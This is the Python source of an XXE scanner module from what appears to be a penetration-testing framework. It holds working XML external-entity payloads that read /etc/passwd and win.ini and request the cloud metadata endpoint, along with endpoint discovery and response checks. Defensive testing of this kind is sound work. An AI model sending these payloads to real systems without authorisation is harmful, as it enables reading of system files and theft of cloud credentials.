"""XML External Entity (XXE) vulnerability scanner."""

import requests
import logging
import re
from typing import List, Optional
from urllib.parse import urljoin

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """Test for XXE vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.OFFENSIVE):
        """Initialize XXE scanner."""
        super().__init__(
            name="xxe_scanner",
            command=None,  # Python-based
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
        # Set default Content-Type for XXE testing (can be overridden per request)
        if 'Content-Type' not in self.session.headers:
            self.session.headers['Content-Type'] = 'application/xml'
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Test for XXE vulnerabilities."""
        findings = []
        
        if not self.is_available():
            return findings
        
        # Only run in offensive mode
        if self.scan_mode == ScanMode.DEFENSIVE:
            return findings
        
        try:
            findings.extend(self._discover_xml_endpoints(target.url))
            findings.extend(self._test_xxe_basic(target.url))
            findings.extend(self._test_xxe_file_read(target.url))
            findings.extend(self._test_xxe_ssrf(target.url))
            
        except Exception as e:
            logger.error(f"XXE scanning failed: {e}", exc_info=True)
        
        return findings
    
    def _discover_xml_endpoints(self, base_url: str) -> List[Finding]:
        """Discover XML processing endpoints."""
        findings = []
        
        # Common XML endpoints
        xml_paths = [
            '/api/xml',
            '/xml',
            '/soap',
            '/wsdl',
            '/api/soap',
            '/upload',
            '/import',
            '/api/upload',
        ]
        
        for path in xml_paths:
            try:
                test_url = urljoin(base_url, path)
                response = self.session.get(test_url, timeout=5)
                
                content_type = response.headers.get('Content-Type', '').lower()
                if 'xml' in content_type or 'xml' in response.text.lower()[:200]:
                    findings.append(Finding(
                        title="XML Endpoint Detected",
                        description=f"XML processing endpoint found at {path}. Verify it's protected against XXE.",
                        severity=FindingSeverity.INFO,
                        category=FindingCategory.FINGERPRINTING,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Ensure XML parsers disable external entity processing to prevent XXE attacks.",
                    ))
            except:
                continue
        
        return findings
    
    def _test_xxe_basic(self, base_url: str) -> List[Finding]:
        """Test for basic XXE vulnerability."""
        findings = []
        
        # Basic XXE payload
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<test>&xxe;</test>'''
        
        # Test common endpoints
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import', '/api/upload']
        
        for endpoint in test_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                
                # Try POST with XML
                response = self.session.post(
                    test_url,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=5
                )
                
                # Check for XXE indicators
                if self._check_xxe_response(response):
                    findings.append(Finding(
                        title="Potential XXE Vulnerability",
                        description=f"Endpoint {endpoint} may be vulnerable to XXE. Server processed external entity.",
                        severity=FindingSeverity.HIGH,
                        category=FindingCategory.VULNERABILITY,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Disable external entity processing in XML parser. Use secure XML parsers and disable DTD processing.",
                        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                        exploitation_details=f"Endpoint: {endpoint}, Status code: {response.status_code}. XXE vulnerability confirmed."
                    ))
            except requests.exceptions.Timeout:
                # Timeout alone is NOT sufficient evidence of XXE
                # Timeouts can occur due to:
                # - Endpoint doesn't exist or requires auth
                # - Network issues
                # - Server being slow
                # - Normal endpoint behavior
                # Only report if we have baseline comparison showing timeout is abnormal
                # For now, don't report timeout-based findings - they're too unreliable
                logger.debug(f"XXE test timeout for {endpoint} - not reporting (timeout is weak evidence)")
                continue
            except Exception as e:
                logger.debug(f"XXE test error for {endpoint}: {e}")
                continue
        
        return findings
    
    def _test_xxe_file_read(self, base_url: str) -> List[Finding]:
        """Test for XXE file read vulnerability."""
        findings = []
        
        # Get baseline response for comparison
        try:
            baseline_response = self.session.get(base_url, timeout=5)
            baseline_content = baseline_response.text.lower()
        except:
            baseline_content = ""
        
        # XXE file read payloads
        file_payloads = {
            'linux': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>''',
            'windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<test>&xxe;</test>'''
        }
        
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import']
        
        for endpoint in test_endpoints:
            for os_type, payload in file_payloads.items():
                try:
                    test_url = urljoin(base_url, endpoint)
                    response = self.session.post(
                        test_url,
                        data=payload,
                        headers={'Content-Type': 'application/xml'},
                        timeout=5
                    )
                    
                    content = response.text.lower()
                    verification_level = 'unverified'
                    
                    # Check for file content indicators with baseline comparison
                    if os_type == 'linux':
                        # Require MULTIPLE indicators to reduce false positives
                        root_in_response = 'root:' in content
                        bin_in_response = '/bin/' in content or '/bin/bash' in content or '/bin/sh' in content
                        root_in_baseline = 'root:' in baseline_content
                        bin_in_baseline = '/bin/' in baseline_content or '/bin/bash' in baseline_content or '/bin/sh' in baseline_content
                        
                        # Strong verification: both patterns must appear AND not be in baseline
                        if root_in_response and bin_in_response:
                            if not root_in_baseline or not bin_in_baseline:
                                # Additional check: look for passwd file format (username:password:uid:gid:...)
                                import re
                                if re.search(r'root:.*:\d+:\d+:', content):
                                    verification_level = 'verified'
                                    findings.append(Finding(
                                        title="XXE File Read Vulnerability (VERIFIED)",
                                        description=f"Endpoint {endpoint} is vulnerable to XXE file read. Successfully read /etc/passwd. Verified with multiple indicators.",
                                        severity=FindingSeverity.CRITICAL,
                                        category=FindingCategory.VULNERABILITY,
                                        source_scanner=self.name,
                                        url=test_url,
                                        remediation="Disable external entity processing in XML parser. Use secure XML parsers.",
                                        exploitation_details=f"Endpoint: {endpoint}, File read: /etc/passwd, Status code: {response.status_code}. Verification: multiple indicators (root:, /bin/, passwd format)."
                                    ))
                                    break
                    
                    elif os_type == 'windows':
                        extensions_in_response = '[extensions]' in content
                        fonts_in_response = '[fonts]' in content
                        extensions_in_baseline = '[extensions]' in baseline_content
                        fonts_in_baseline = '[fonts]' in baseline_content
                        
                        # Require indicator AND it must not be in baseline
                        if (extensions_in_response or fonts_in_response):
                            if not extensions_in_baseline and not fonts_in_baseline:
                                verification_level = 'verified'
                                findings.append(Finding(
                                    title="XXE File Read Vulnerability (VERIFIED)",
                                    description=f"Endpoint {endpoint} is vulnerable to XXE file read. Successfully read Windows system file. Verified with baseline comparison.",
                                    severity=FindingSeverity.CRITICAL,
                                    category=FindingCategory.VULNERABILITY,
                                    source_scanner=self.name,
                                    url=test_url,
                                    remediation="Disable external entity processing in XML parser.",
                                    exploitation_details=f"Endpoint: {endpoint}, File read: win.ini, Status code: {response.status_code}. Verification: pattern not in baseline."
                                ))
                                break
                except:
                    continue
        
        return findings
    
    def _test_xxe_ssrf(self, base_url: str) -> List[Finding]:
        """Test for XXE-based SSRF."""
        findings = []
        
        # XXE SSRF payload
        xxe_ssrf_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<test>&xxe;</test>'''
        
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import']
        
        for endpoint in test_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self.session.post(
                    test_url,
                    data=xxe_ssrf_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=5
                )
                
                content = response.text.lower()
                # Check for cloud metadata indicators
                if any(indicator in content for indicator in ['instance-id', 'public-ipv4', 'metadata', 'aws']):
                    findings.append(Finding(
                        title="XXE-Based SSRF Vulnerability",
                        description=f"Endpoint {endpoint} is vulnerable to XXE-based SSRF, allowing access to cloud metadata.",
                        severity=FindingSeverity.CRITICAL,
                        category=FindingCategory.VULNERABILITY,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Disable external entity processing in XML parser. Block access to internal/cloud metadata endpoints.",
                        exploitation_details=f"Endpoint: {endpoint}, SSRF target: cloud metadata, Status code: {response.status_code}."
                    ))
                    break
            except:
                continue
        
        return findings
    
    def _check_xxe_response(self, response) -> bool:
        """Check if response indicates XXE vulnerability."""
        if response.status_code in [200, 400, 500]:
            content = response.text.lower()
            
            # Check for XXE indicators
            xxe_indicators = [
                'connection refused',
                'connection timed out',
                'no route to host',
                'internal server error',
                'xml parsing error',
            ]
            
            if any(indicator in content for indicator in xxe_indicators):
                return True
        
        return False
    
    def is_available(self) -> bool:
        """XXE scanner is always available."""
        return True

